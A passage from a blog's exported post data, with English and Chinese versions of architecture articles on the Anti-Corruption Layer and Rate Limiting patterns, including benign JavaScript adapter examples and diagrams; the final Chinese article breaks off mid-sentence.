你將如何處理尖峰流量？ 多個 ACL 實例 你可能需要多個防腐層： 不同子系統使用不同的技術或語言 關注點分離（每個舊系統一個 ACL） 團隊所有權邊界 效能最佳化（區域部署） 交易和資料一致性 🔄 一致性挑戰確保在 ACL 邊界上維護交易和資料一致性。這對於跨越兩個系統的操作尤其重要。 !!! 考慮： 你將如何處理分散式交易？ 你需要什麼一致性保證？ 你將如何監控資料完整性？ 你的回滾策略是什麼？ 責任範圍 確定 ACL 應該處理什麼： 所有通訊：每個互動都通過 ACL 功能子集：只有特定操作使用 ACL 讀取與寫入：查詢和更新的不同策略 遷移策略 如果 ACL 是遷移策略的一部分： 臨時性：遷移完成後會被淘汰嗎？ 永久性：它會作為整合層保留嗎？ 階段性淘汰：你將如何逐步移除它？ ✅ 何時使用此模式 防腐層模式在以下情況下是理想的： 漸進式遷移：計劃分多個階段進行遷移，但必須維護新舊系統之間的整合 語義差異：兩個或多個子系統具有不同的語義但仍需要通訊 外部依賴：你需要與你無法控制的第三方系統整合 品質保護：你想保護你的乾淨架構免受設計不良的外部系統影響 團隊自主性：不同團隊擁有不同的子系統並需要明確的邊界 ❌ 何時不使用此模式 此模式在以下情況下可能不適合： 無語義差異：新舊系統已經共享相似的設計和資料模型 簡單整合：整合很簡單，不值得增加額外的複雜性 效能關鍵：增加的延遲對你的使用案例來說是不可接受的 資源限制：你缺乏維護額外服務的資源 🎯 實際範例 假設你正在現代化一個電子商務平台。舊系統這樣儲存客戶資料： &#123; &quot;CUST_ID&quot;: &quot;12345&quot;, &quot;FIRST_NM&quot;: &quot;John&quot;, &quot;LAST_NM&quot;: &quot;Doe&quot;, &quot;EMAIL_ADDR&quot;: &quot;john@example.com&quot;, &quot;CREATE_DT&quot;: &quot;20190215&quot;, &quot;STATUS_CD&quot;: &quot;A&quot; &#125; 你的現代應用程式使用這個模型： &#123; &quot;customerId&quot;: &quot;12345&quot;, &quot;fullName&quot;: &quot;John Doe&quot;, &quot;email&quot;: &quot;john@example.com&quot;, &quot;registeredAt&quot;: &quot;2019-02-15T00:00:00Z&quot;, &quot;isActive&quot;: true &#125; ACL 處理轉譯： class CustomerAdapter &#123; toLegacyFormat(modernCustomer) &#123; return &#123; CUST_ID: modernCustomer.customerId, FIRST_NM: modernCustomer.fullName.split(&#39; &#39;)[0], LAST_NM: modernCustomer.fullName.split(&#39; &#39;).slice(1).join(&#39; &#39;), EMAIL_ADDR: modernCustomer.email, CREATE_DT: modernCustomer.registeredAt.replace(&#x2F;-&#x2F;g, &#39;&#39;).substring(0, 8), STATUS_CD: modernCustomer.isActive ? &#39;A&#39; : &#39;I&#39; &#125;; &#125; toModernFormat(legacyCustomer) &#123; return &#123; customerId: legacyCustomer.CUST_ID, fullName: &#96;$&#123;legacyCustomer.FIRST_NM&#125; $&#123;legacyCustomer.LAST_NM&#125;&#96;, email: legacyCustomer.EMAIL_ADDR, registeredAt: this.parseDate(legacyCustomer.CREATE_DT), isActive: legacyCustomer.STATUS_CD &#x3D;&#x3D;&#x3D; &#39;A&#39; &#125;; &#125; parseDate(dateStr) &#123; &#x2F;&#x2F; 將 YYYYMMDD 轉換為 ISO 格式 return &#96;$&#123;dateStr.substring(0,4)&#125;-$&#123;dateStr.substring(4,6)&#125;-$&#123;dateStr.substring(6,8)&#125;T00:00:00Z&#96;; &#125; &#125; 🏆 優點 實作防腐層模式提供了幾個優勢： 設計獨立性：你的現代應用程式維護其乾淨的架構 靈活性：易於替換或升級舊系統 團隊自主性：團隊可以獨立地在不同的子系統上工作 漸進式遷移：支援階段性現代化方法 可測試性：使用模擬的 ACL 回應更容易測試 可維護性：對舊系統的變更被隔離在 ACL 中 📚 參考資料 Evans, Eric. 領域驅動設計：軟體核心複雜性的解決方法. Addison-Wesley, 2003. 雲端設計模式 - 防腐層 防腐層模式是在整合舊系統或外部系統時維護架構完整性的強大工具。透過將轉譯邏輯隔離在專用層中，你可以保護現代應用程式免受直接整合所需的妥協。雖然它增加了複雜性和營運開銷，但乾淨架構和可維護性的好處通常超過這些成本，特別是在大規模現代化工作中。","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"防腐层模式：保护你的现代化架构","slug":"2019/02/Anti-Corruption-Layer-Pattern-zh-CN","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-CN/2019/02/Anti-Corruption-Layer-Pattern/","permalink":"https://neo01.com/zh-CN/2019/02/Anti-Corruption-Layer-Pattern/","excerpt":"了解防腐层模式如何帮助你集成遗留系统与现代应用程序，同时不损害你的干净架构设计。","text":"在构建现代应用程序时，你经常需要集成不共享相同设计原则的遗留系统或外部服务。防腐层模式为这个挑战提供了优雅的解决方案，作为一个保护屏障，防止你的干净架构被过时或设计不良的外部系统&quot;污染&quot;。 🎯 什么是防腐层模式？ 防腐层（ACL）模式最早由 Eric Evans 在其开创性著作《领域驱动设计》中描述，它在不共享相同语义的不同子系统之间实现了一个外观层或适配器层。这一层转译一个子系统向另一个子系统发出的请求，确保你的应用程序设计不受外部系统依赖的限制。 可以把它想象成两个说不同语言、遵循不同习俗的国家之间的外交翻译。翻译确保顺畅沟通，同时每个国家都保持自己的文化和实践。 📖 问题：遗留系统集成 大多数应用程序依赖其他系统来获取数据或功能。考虑这些常见场景： 遗留系统迁移：遗留应用程序正在迁移到现代系统，但在过渡期间仍需要访问现有的遗留资源 渐进式现代化：大型应用程序的不同功能随时间逐步迁移到现代系统 第三方集成：你的应用程序需要与你无法控制的外部系统通信 遗留系统通常存在质量问题： 复杂的数据结构 过时的 API 过时的协议 文档不足 不一致的命名惯例 为了与这些系统互通，你的新应用程序可能被迫支持过时的基础设施、协议、数据模型或 API——这些都是你原本不会在现代应用程序中包含的功能。这会&quot;污染&quot;原本可以是干净设计的系统。 ⚠️ 污染风险维护新旧系统之间的直接访问可能迫使新系统遵守遗留系统的 API 和语义。当这些遗留功能存在质量问题时，它们会损害你现代应用程序的设计完整性。 !!! 💡 解决方案：通过转译进行隔离 防腐层模式通过隔离不同的子系统并在它们之间放置一个转译层来解决这个问题。这一层处理两个系统之间的所有通信，允许一个系统保持不变，而另一个系统避免损害其设计。 graph LR A[\"现代应用程序（子系统 A）\"] ACL[\"防腐层\"] B[\"遗留系统（子系统 B）\"] A -->|\"干净的 API现代数据模型\"| ACL ACL -->|\"遗留 API遗留数据模型\"| B style A fill:#4CAF50,stroke:#2E7D32,color:#fff style ACL fill:#2196F3,stroke:#1565C0,color:#fff style B fill:#FF9800,stroke:#E65100,color:#fff 运作方式 子系统 A（你的现代应用程序）使用自己的干净数据模型和架构调用防腐层 ACL 将请求转译为子系统 B 预期的格式 子系统 B（遗留系统）以其原生格式接收请求 ACL 将响应转译回子系统 A 的格式 子系统 A 以其预期的格式接收数据，完全不知道遗留系统的怪癖 防腐层包含在两个系统之间进行转译所需的所有逻辑，包括： 数据转换：在不同数据模型之间转换 协议适配：桥接不同的通信协议 API 映射：在不同的 API 契约之间转译 错误处理：转换错误格式和代码 🏗️ 实现方法 防腐层可以通过多种方式实现： 1. 应用程序内的组件 将 ACL 实现为应用程序内的模块或组件： &#x2F;&#x2F; 示例：ACL 作为服务类 class LegacySystemAdapter &#123; constructor(legacyClient) &#123; this.legacyClient &#x3D; legacyClient; &#125; async getCustomer(customerId) &#123; &#x2F;&#x2F; 调用遗留系统 const legacyData &#x3D; await this.legacyClient.fetchCustomerRecord(customerId); &#x2F;&#x2F; 转换为现代格式 return &#123; id: legacyData.CUST_ID, name: &#96;$&#123;legacyData.FIRST_NM&#125; $&#123;legacyData.LAST_NM&#125;&#96;, email: legacyData.EMAIL_ADDR, createdAt: new Date(legacyData.CREATE_DT) &#125;; &#125; &#125; 2. 独立服务 将 ACL 部署为独立的微服务： graph TB subgraph \"现代架构\" A1[服务 A] A2[服务 B] A3[服务 C] end ACL[\"ACL 服务\"] subgraph \"遗留系统\" L1[遗留数据库] L2[遗留 API] end A1 --> ACL A2 --> ACL A3 --> ACL ACL --> L1 ACL --> L2 style ACL fill:#2196F3,stroke:#1565C0,color:#fff 3. API 网关模式 使用 API 网关来实现 ACL 功能： 集中式转译逻辑 速率限制和缓存 身份验证和授权 请求/响应转换 ⚖️ 关键考量 在实现防腐层之前，请考虑这些重要因素： 性能影响 🐌 延迟考量防腐层在通信路径中增加了额外的跳跃，这会引入延迟。测量和监控这种影响，特别是对于高频率操作。 !!! 缓解策略： 为经常访问的数据实现缓存 尽可能使用异步通信 优化转换逻辑 考虑批处理操作 运营开销 ACL 是一个需要以下资源的额外组件： 部署和托管：基础设施和资源 监控：健康检查、指标和日志记录 维护：更新、错误修复和改进 文档：API 契约和转换规则 可扩展性 考虑你的防腐层将如何扩展： 随着应用程序增长，它能处理增加的负载吗？ 它应该是水平可扩展的吗？ 瓶颈在哪里？ 你将如何处理峰值流量？ 多个 ACL 实例 你可能需要多个防腐层： 不同子系统使用不同的技术或语言 关注点分离（每个遗留系统一个 ACL） 团队所有权边界 性能优化（区域部署） 事务和数据一致性 🔄 一致性挑战确保在 ACL 边界上维护事务和数据一致性。这对于跨越两个系统的操作尤其重要。 !!! 考虑： 你将如何处理分布式事务？ 你需要什么一致性保证？ 你将如何监控数据完整性？ 你的回滚策略是什么？ 责任范围 确定 ACL 应该处理什么： 所有通信：每个交互都通过 ACL 功能子集：只有特定操作使用 ACL 读取与写入：查询和更新的不同策略 迁移策略 如果 ACL 是迁移策略的一部分： 临时性：迁移完成后会被淘汰吗？ 永久性：它会作为集成层保留吗？ 阶段性淘汰：你将如何逐步移除它？ ✅ 何时使用此模式 防腐层模式在以下情况下是理想的： 渐进式迁移：计划分多个阶段进行迁移，但必须维护新旧系统之间的集成 语义差异：两个或多个子系统具有不同的语义但仍需要通信 外部依赖：你需要与你无法控制的第三方系统集成 质量保护：你想保护你的干净架构免受设计不良的外部系统影响 团队自主性：不同团队拥有不同的子系统并需要明确的边界 ❌ 何时不使用此模式 此模式在以下情况下可能不适合： 无语义差异：新旧系统已经共享相似的设计和数据模型 简单集成：集成很简单，不值得增加额外的复杂性 性能关键：增加的延迟对你的用例来说是不可接受的 资源限制：你缺乏维护额外服务的资源 🎯 实际示例 假设你正在现代化一个电子商务平台。遗留系统这样存储客户数据： &#123; &quot;CUST_ID&quot;: &quot;12345&quot;, &quot;FIRST_NM&quot;: &quot;John&quot;, &quot;LAST_NM&quot;: &quot;Doe&quot;, &quot;EMAIL_ADDR&quot;: &quot;john@example.com&quot;, &quot;CREATE_DT&quot;: &quot;20190215&quot;, &quot;STATUS_CD&quot;: &quot;A&quot; &#125; 你的现代应用程序使用这个模型： &#123; &quot;customerId&quot;: &quot;12345&quot;, &quot;fullName&quot;: &quot;John Doe&quot;, &quot;email&quot;: &quot;john@example.com&quot;, &quot;registeredAt&quot;: &quot;2019-02-15T00:00:00Z&quot;, &quot;isActive&quot;: true &#125; ACL 处理转译： class CustomerAdapter &#123; toLegacyFormat(modernCustomer) &#123; return &#123; CUST_ID: modernCustomer.customerId, FIRST_NM: modernCustomer.fullName.split(&#39; &#39;)[0], LAST_NM: modernCustomer.fullName.split(&#39; &#39;).slice(1).join(&#39; &#39;), EMAIL_ADDR: modernCustomer.email, CREATE_DT: modernCustomer.registeredAt.replace(&#x2F;-&#x2F;g, &#39;&#39;).substring(0, 8), STATUS_CD: modernCustomer.isActive ? &#39;A&#39; : &#39;I&#39; &#125;; &#125; toModernFormat(legacyCustomer) &#123; return &#123; customerId: legacyCustomer.CUST_ID, fullName: &#96;$&#123;legacyCustomer.FIRST_NM&#125; $&#123;legacyCustomer.LAST_NM&#125;&#96;, email: legacyCustomer.EMAIL_ADDR, registeredAt: this.parseDate(legacyCustomer.CREATE_DT), isActive: legacyCustomer.STATUS_CD &#x3D;&#x3D;&#x3D; &#39;A&#39; &#125;; &#125; parseDate(dateStr) &#123; &#x2F;&#x2F; 将 YYYYMMDD 转换为 ISO 格式 return &#96;$&#123;dateStr.substring(0,4)&#125;-$&#123;dateStr.substring(4,6)&#125;-$&#123;dateStr.substring(6,8)&#125;T00:00:00Z&#96;; &#125; &#125; 🏆 优点 实现防腐层模式提供了几个优势： 设计独立性：你的现代应用程序维护其干净的架构 灵活性：易于替换或升级遗留系统 团队自主性：团队可以独立地在不同的子系统上工作 渐进式迁移：支持阶段性现代化方法 可测试性：使用模拟的 ACL 响应更容易测试 可维护性：对遗留系统的变更被隔离在 ACL 中 📚 参考资料 Evans, Eric. 领域驱动设计：软件核心复杂性的解决方法. Addison-Wesley, 2003. 云设计模式 - 防腐层 防腐层模式是在集成遗留系统或外部系统时维护架构完整性的强大工具。通过将转译逻辑隔离在专用层中，你可以保护现代应用程序免受直接集成所需的妥协。虽然它增加了复杂性和运营开销，但干净架构和可维护性的好处通常超过这些成本，特别是在大规模现代化工作中。","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"Anti-Corruption Layer Pattern: Protecting Your Modern Architecture","slug":"2019/02/Anti-Corruption-Layer-Pattern","date":"un55fin55","updated":"un55fin55","comments":true,"path":"2019/02/Anti-Corruption-Layer-Pattern/","permalink":"https://neo01.com/2019/02/Anti-Corruption-Layer-Pattern/","excerpt":"Learn how the Anti-Corruption Layer pattern helps you integrate legacy systems with modern applications without compromising your clean architecture design.","text":"When building modern applications, you often need to integrate with legacy systems or external services that don’t share the same design principles. The Anti-Corruption Layer pattern provides an elegant solution to this challenge, acting as a protective barrier that keeps your clean architecture from being “corrupted” by outdated or poorly designed external systems. 🎯 What is the Anti-Corruption Layer Pattern? The Anti-Corruption Layer (ACL) pattern, first described by Eric Evans in his seminal book Domain-Driven Design, implements a façade or adapter layer between different subsystems that don’t share the same semantics. This layer translates requests that one subsystem makes to the other subsystem, ensuring that your application’s design isn’t limited by dependencies on outside systems. Think of it as a diplomatic translator between two countries that speak different languages and follow different customs. The translator ensures smooth communication while each country maintains its own culture and practices. 📖 The Problem: Legacy System Integration Most applications rely on other systems for data or functionality. Consider these common scenarios: Legacy Migration: A legacy application is being migrated to a modern system, but still needs to access existing legacy resources during the transition Gradual Modernization: Different features of a larger application are moved to a modern system over time Third-Party Integration: Your application needs to communicate with external systems you don’t control Legacy systems often suffer from quality issues: Convoluted data schemas Obsolete APIs Outdated protocols Poor documentation Inconsistent naming conventions To interoperate with these systems, your new application might be forced to support outdated infrastructure, protocols, data models, or APIs—features you wouldn’t otherwise include in a modern application. This “corrupts” what could be a cleanly designed system. ⚠️ The Corruption RiskMaintaining direct access between new and legacy systems can force the new system to adhere to the legacy system's APIs and semantics. When these legacy features have quality issues, they compromise your modern application's design integrity. !!! 💡 The Solution: Isolation Through Translation The Anti-Corruption Layer pattern solves this by isolating different subsystems and placing a translation layer between them. This layer handles all communication between the two systems, allowing one system to remain unchanged while the other avoids compromising its design. graph LR A[\"Modern Application(Subsystem A)\"] ACL[\"Anti-CorruptionLayer\"] B[\"Legacy System(Subsystem B)\"] A -->|\"Clean APIModern Data Model\"| ACL ACL -->|\"Legacy APILegacy Data Model\"| B style A fill:#4CAF50,stroke:#2E7D32,color:#fff style ACL fill:#2196F3,stroke:#1565C0,color:#fff style B fill:#FF9800,stroke:#E65100,color:#fff How It Works Subsystem A (your modern application) calls the anti-corruption layer using its own clean data model and architecture The ACL translates the request into the format expected by Subsystem B Subsystem B (the legacy system) receives the request in its native format The ACL translates the response back into Subsystem A’s format Subsystem A receives the data in its expected format, completely unaware of the legacy system’s quirks The anti-corruption layer contains all the logic necessary to translate between the two systems, including: Data transformation: Converting between different data models Protocol adaptation: Bridging different communication protocols API mapping: Translating between different API contracts Error handling: Converting error formats and codes 🏗️ Implementation Approaches The anti-corruption layer can be implemented in several ways: 1. Component Within Application Implement the ACL as a module or component within your application: &#x2F;&#x2F; Example: ACL as a service class class LegacySystemAdapter &#123; constructor(legacyClient) &#123; this.legacyClient &#x3D; legacyClient; &#125; async getCustomer(customerId) &#123; &#x2F;&#x2F; Call legacy system const legacyData &#x3D; await this.legacyClient.fetchCustomerRecord(customerId); &#x2F;&#x2F; Transform to modern format return &#123; id: legacyData.CUST_ID, name: &#96;$&#123;legacyData.FIRST_NM&#125; $&#123;legacyData.LAST_NM&#125;&#96;, email: legacyData.EMAIL_ADDR, createdAt: new Date(legacyData.CREATE_DT) &#125;; &#125; &#125; 2. Independent Service Deploy the ACL as a separate microservice: graph TB subgraph \"Modern Architecture\" A1[Service A] A2[Service B] A3[Service C] end ACL[\"ACL Service\"] subgraph \"Legacy Systems\" L1[Legacy DB] L2[Legacy API] end A1 --> ACL A2 --> ACL A3 --> ACL ACL --> L1 ACL --> L2 style ACL fill:#2196F3,stroke:#1565C0,color:#fff 3. API Gateway Pattern Use an API gateway to implement the ACL functionality: Centralized translation logic Rate limiting and caching Authentication and authorization Request/response transformation ⚖️ Key Considerations Before implementing an anti-corruption layer, consider these important factors: Performance Impact 🐌 Latency ConsiderationsThe anti-corruption layer adds an additional hop in the communication path, which introduces latency. Measure and monitor this impact, especially for high-frequency operations. !!! Mitigation strategies: Implement caching for frequently accessed data Use asynchronous communication where possible Optimize transformation logic Consider batch operations Operational Overhead The ACL is an additional component that requires: Deployment and hosting: Infrastructure and resources Monitoring: Health checks, metrics, and logging Maintenance: Updates, bug fixes, and improvements Documentation: API contracts and transformation rules Scalability Consider how your anti-corruption layer will scale: Will it handle increased load as your application grows? Should it be horizontally scalable? What are the bottlenecks? How will you handle peak traffic? Multiple ACL Instances You might need more than one anti-corruption layer: Different technologies or languages for different subsystems Separation of concerns (one ACL per legacy system) Team ownership boundaries Performance optimization (regional deployments) Transaction and Data Consistency 🔄 Consistency ChallengesEnsure transaction and data consistency are maintained across the ACL boundary. This is especially critical for operations that span both systems. !!! Consider: How will you handle distributed transactions? What consistency guarantees do you need? How will you monitor data integrity? What’s your rollback strategy? Scope of Responsibility Determine what the ACL should handle: All communication: Every interaction goes through the ACL Subset of features: Only specific operations use the ACL Read vs. Write: Different strategies for queries and updates Migration Strategy If the ACL is part of a migration strategy: Temporary: Will it be retired after migration completes? Permanent: Will it remain as an integration layer? Phased retirement: How will you gradually remove it? ✅ When to Use This Pattern The Anti-Corruption Layer pattern is ideal when: Gradual Migration: A migration is planned over multiple stages, but integration between new and legacy systems must be maintained Semantic Differences: Two or more subsystems have different semantics but still need to communicate External Dependencies: You need to integrate with third-party systems you don’t control Quality Protection: You want to protect your clean architecture from poorly designed external systems Team Autonomy: Different teams own different subsystems and need clear boundaries ❌ When Not to Use This Pattern This pattern might not be suitable when: No Semantic Differences: New and legacy systems already share similar designs and data models Simple Integration: The integration is straightforward and doesn’t justify the additional complexity Performance Critical: The added latency is unacceptable for your use case Resource Constraints: You lack the resources to maintain an additional service 🎯 Real-World Example Let’s say you’re modernizing an e-commerce platform. The legacy system stores customer data like this: &#123; &quot;CUST_ID&quot;: &quot;12345&quot;, &quot;FIRST_NM&quot;: &quot;John&quot;, &quot;LAST_NM&quot;: &quot;Doe&quot;, &quot;EMAIL_ADDR&quot;: &quot;john@example.com&quot;, &quot;CREATE_DT&quot;: &quot;20190215&quot;, &quot;STATUS_CD&quot;: &quot;A&quot; &#125; Your modern application uses this model: &#123; &quot;customerId&quot;: &quot;12345&quot;, &quot;fullName&quot;: &quot;John Doe&quot;, &quot;email&quot;: &quot;john@example.com&quot;, &quot;registeredAt&quot;: &quot;2019-02-15T00:00:00Z&quot;, &quot;isActive&quot;: true &#125; The ACL handles the translation: class CustomerAdapter &#123; toLegacyFormat(modernCustomer) &#123; return &#123; CUST_ID: modernCustomer.customerId, FIRST_NM: modernCustomer.fullName.split(&#39; &#39;)[0], LAST_NM: modernCustomer.fullName.split(&#39; &#39;).slice(1).join(&#39; &#39;), EMAIL_ADDR: modernCustomer.email, CREATE_DT: modernCustomer.registeredAt.replace(&#x2F;-&#x2F;g, &#39;&#39;).substring(0, 8), STATUS_CD: modernCustomer.isActive ? &#39;A&#39; : &#39;I&#39; &#125;; &#125; toModernFormat(legacyCustomer) &#123; return &#123; customerId: legacyCustomer.CUST_ID, fullName: &#96;$&#123;legacyCustomer.FIRST_NM&#125; $&#123;legacyCustomer.LAST_NM&#125;&#96;, email: legacyCustomer.EMAIL_ADDR, registeredAt: this.parseDate(legacyCustomer.CREATE_DT), isActive: legacyCustomer.STATUS_CD &#x3D;&#x3D;&#x3D; &#39;A&#39; &#125;; &#125; parseDate(dateStr) &#123; &#x2F;&#x2F; Convert YYYYMMDD to ISO format return &#96;$&#123;dateStr.substring(0,4)&#125;-$&#123;dateStr.substring(4,6)&#125;-$&#123;dateStr.substring(6,8)&#125;T00:00:00Z&#96;; &#125; &#125; 🏆 Benefits Implementing the Anti-Corruption Layer pattern provides several advantages: Design Independence: Your modern application maintains its clean architecture Flexibility: Easy to swap out or upgrade legacy systems Team Autonomy: Teams can work independently on different subsystems Gradual Migration: Supports phased modernization approaches Testability: Easier to test with mocked ACL responses Maintainability: Changes to legacy systems are isolated to the ACL 📚 References Evans, Eric. Domain-Driven Design: Tackling Complexity in the Heart of Software. Addison-Wesley, 2003. Cloud Design Patterns - Anti-Corruption Layer The Anti-Corruption Layer pattern is a powerful tool for maintaining architectural integrity while integrating with legacy or external systems. By isolating the translation logic in a dedicated layer, you protect your modern application from the compromises that direct integration would require. While it adds complexity and operational overhead, the benefits of clean architecture and maintainability often outweigh these costs, especially in large-scale modernization efforts.","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"Rate Limiting Pattern: Efficiently Managing Throttled Services","slug":"2019/01/Rate-Limiting-Pattern","date":"un11fin11","updated":"un55fin55","comments":true,"path":"/2019/01/Rate-Limiting-Pattern/","permalink":"https://neo01.com/2019/01/Rate-Limiting-Pattern/","excerpt":"Learn how the rate limiting pattern helps you avoid throttling errors and improve throughput when working with services that impose usage limits.","text":"Many services use throttling to control resource consumption, imposing limits on the rate at which applications can access them. The rate limiting pattern helps you avoid throttling errors and accurately predict throughput, especially for large-scale repetitive tasks like batch processing. Context and Problem Performing large numbers of operations against a throttled service can result in increased traffic and reduced efficiency. You’ll need to track rejected requests and retry operations, potentially requiring multiple passes to complete your work. Consider this example of ingesting data into a database: Your application needs to ingest 10,000 records. Each record costs 10 Request Units (RUs), requiring 100,000 RUs total. Your database instance has 20,000 RUs provisioned capacity. You send all 10,000 records. 2,000 succeed, 8,000 are rejected. You retry with 8,000 records. 2,000 succeed, 6,000 are rejected. You retry with 6,000 records. 2,000 succeed, 4,000 are rejected. You retry with 4,000 records. 2,000 succeed, 2,000 are rejected. You retry with 2,000 records. All succeed. The job completed, but only after sending 30,000 records—three times the actual dataset size. Additional problems with this naive approach: Error handling overhead: 20,000 errors need logging and processing, consuming memory and storage. Unpredictable completion time: Without knowing throttling limits, you can’t estimate how long processing will take. Solution Rate limiting reduces traffic and improves throughput by controlling the number of records sent to a service over time. Services throttle based on different metrics: Number of operations (e.g., 20 requests per second) Amount of data (e.g., 2 GiB per minute) Relative cost of operations (e.g., 20,000 RUs per second) Your rate limiting implementation must control operations sent to the service, optimizing usage without exceeding capacity. Using a Durable Messaging System When your APIs can handle requests faster than throttled services allow, you need to manage ingestion speed. Simply buffering requests is risky—if your application crashes, you lose buffered data. Instead, send records to a durable messaging system that can handle your full ingestion rate. Use job processors to read records at a controlled rate within the throttled service’s limits. Durable messaging options include: Message queues (e.g., RabbitMQ, ActiveMQ) Event streaming platforms (e.g., Apache Kafka) Cloud-based queue services graph LR A[\"API(High Rate)\"] --> B[\"DurableMessage Queue\"] B --> C[\"Job Processor 1\"] B --> D[\"Job Processor 2\"] B --> E[\"Job Processor 3\"] C --> F[\"Throttled Service(Limited Rate)\"] D --> F E --> F style A fill:#e1f5ff style B fill:#fff4e1 style F fill:#ffe1e1 Granular Time Intervals Services often throttle based on comprehensible timespans (per second or per minute), but computers process much faster. Rather than batching releases once per second, send smaller amounts more frequently to: Keep resource consumption (memory, CPU, network) flowing evenly Prevent bottlenecks from sudden request bursts For example, if a service allows 100 operations per second, release 20 operations every 200 milliseconds: (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_97d2a41f7')); var option = { \"title\": { \"text\": \"Rate Limiting: Smooth vs Burst Traffic\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Burst (100/sec)\", \"Smooth (20/200ms)\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"0ms\", \"200ms\", \"400ms\", \"600ms\", \"800ms\", \"1000ms\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Operations\" }, \"series\": [ { \"name\": \"Burst (100/sec)\", \"type\": \"bar\", \"data\": [100, 0, 0, 0, 0, 100], \"itemStyle\": { \"color\": \"#ff6b6b\" } }, { \"name\": \"Smooth (20/200ms)\", \"type\": \"bar\", \"data\": [20, 20, 20, 20, 20, 20], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); Managing Multiple Uncoordinated Processes When multiple processes share a throttled service, logically partition the service’s capacity and use a distributed mutual exclusion system to manage locks on those partitions. Example: If a throttled system allows 500 requests per second: Create 20 partitions worth 25 requests per second each A process needing 100 requests asks for four partitions The system grants two partitions for 10 seconds The process rate limits to 50 requests per second, completes in 2 seconds, and releases the lock Implementation approach: Use blob storage to create one small file per logical partition. Applications obtain exclusive leases on these files for short periods (e.g., 15 seconds). For each lease granted, the application can use that partition’s capacity. block-beta columns 3 block:processes:3 columns 3 P1[\"Process 1\"] P2[\"Process 2\"] P3[\"Process 3\"] end space:3 block:leases:3 columns 3 L1[\"Lease 125 req/s\"] L2[\"Lease 225 req/s\"] L3[\"Lease 325 req/s\"] end space:3 block:service:3 S[\"Throttled Service500 req/s total\"] end P1 --> L1 P2 --> L2 P3 --> L3 L1 --> S L2 --> S L3 --> S style processes fill:#e1f5ff style leases fill:#fff4e1 style service fill:#ffe1e1 To reduce latency, allocate a small amount of exclusive capacity for each process. Processes only seek shared capacity leases when exceeding their reserved capacity. Alternative technologies for lease management include Zookeeper, Consul, etcd, and Redis/Redsync. Issues and Considerations 💡 Key ConsiderationsHandle throttling errors: Rate limiting reduces errors but doesn't eliminate them. Your application must still handle any throttling errors that occur. Multiple workstreams: If your application has multiple workstreams accessing the same throttled service (e.g., bulk loading and querying), integrate all into your rate limiting strategy or reserve separate capacity pools for each. Multi-application usage: When multiple applications use the same throttled service, increased throttling errors might indicate contention. Consider temporarily reducing throughput until usage from other applications decreases. !!! When to Use This Pattern Use this pattern to: Reduce throttling errors from throttle-limited services Reduce traffic compared to naive retry-on-error approaches Reduce memory consumption by dequeuing records only when there’s capacity to process them Improve predictability of batch processing completion times Example Architecture Consider an application where users submit records of various types to an API. Each record type has a unique job processor that performs validation, enrichment, and database insertion. All components (API, job processors) are separate processes that scale independently and don’t directly communicate. graph TB U1[\"User\"] --> API[\"API\"] U2[\"User\"] --> API API --> QA[\"Queue A(Type A Records)\"] API --> QB[\"Queue B(Type B Records)\"] QA --> JPA[\"Job Processor A\"] QB --> JPB[\"Job Processor B\"] JPA --> LS[\"Lease Storage(Blob 0-9)\"] JPB --> LS JPA --> DB[\"Database(1000 req/s limit)\"] JPB --> DB style API fill:#e1f5ff style QA fill:#fff4e1 style QB fill:#fff4e1 style LS fill:#f0e1ff style DB fill:#ffe1e1 Workflow: User submits 10,000 records of type A to the API API enqueues records in Queue A User submits 5,000 records of type B to the API API enqueues records in Queue B Job Processor A attempts to lease blob 2 Job Processor B attempts to lease blob 2 Job Processor A fails; Job Processor B obtains the lease for 15 seconds (100 req/s capacity) Job Processor B dequeues and writes 100 records After 1 second, both processors attempt additional leases Job Processor A obtains blob 6 (100 req/s); Job Processor B obtains blob 3 (now 200 req/s total) Processors continue competing for leases and processing records at their granted rates As leases expire (after 15 seconds), processors reduce their request rates accordingly Related Patterns Throttling: Rate limiting is typically implemented in response to a throttled service. Retry: When requests result in throttling errors, retry after an appropriate interval. Queue-Based Load Leveling: Similar but broader than rate limiting. Key differences: Rate limiting doesn’t necessarily require queues but needs durable messaging Rate limiting introduces distributed mutual exclusion on partitions for managing capacity across uncoordinated processes Queue-based load leveling applies to any performance mismatch between services; rate limiting specifically addresses throttled services References Rate Limiting Pattern - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"速率限制模式：高效管理受限服务","slug":"2019/01/Rate-Limiting-Pattern-zh-CN","date":"un11fin11","updated":"un55fin55","comments":true,"path":"/zh-CN/2019/01/Rate-Limiting-Pattern/","permalink":"https://neo01.com/zh-CN/2019/01/Rate-Limiting-Pattern/","excerpt":"了解速率限制模式如何帮助你避免节流错误，并在使用有限制的服务时提升吞吐量。","text":"许多服务使用节流来控制资源消耗，对应用程序访问它们的速率施加限制。速率限制模式帮助你避免节流错误并准确预测吞吐量，特别是对于大规模重复性自动化任务（如批处理）。 情境与问题 对受节流服务执行大量操作可能导致流量增加和效率降低。你需要追踪被拒绝的请求并重试操作，可能需要多次传递才能完成工作。 考虑这个将数据导入数据库的示例： 你的应用程序需要导入 10,000 条记录。每条记录需要 10 个请求单位（RUs），总共需要 100,000 RUs。 你的数据库实例有 20,000 RUs 的预配容量。 你发送所有 10,000 条记录。2,000 条成功，8,000 条被拒绝。 你重试 8,000 条记录。2,000 条成功，6,000 条被拒绝。 你重试 6,000 条记录。2,000 条成功，4,000 条被拒绝。 你重试 4,000 条记录。2,000 条成功，2,000 条被拒绝。 你重试 2,000 条记录。全部成功。 工作完成了，但只是在发送了 30,000 条记录之后——是实际数据集大小的三倍。 这种天真方法的额外问题： 错误处理开销：20,000 